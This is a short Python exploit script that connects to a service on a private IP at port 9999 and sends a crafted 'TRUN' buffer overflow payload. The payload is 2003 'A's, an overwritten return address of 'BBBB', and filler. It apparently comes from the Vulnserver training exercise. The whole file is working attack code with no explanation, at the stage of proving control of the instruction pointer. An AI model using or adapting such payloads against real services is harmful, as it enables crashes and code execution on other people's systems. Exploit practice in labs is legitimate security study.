#!/usr/bin/python

import socket
import os
import sys

host="192.168.31.146"
port=9999

buffer = "TRUN /.:/" + "A" * 2003 + "\x42\x42\x42\x42" + "C" * (5060 - 2003 - 4)

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()

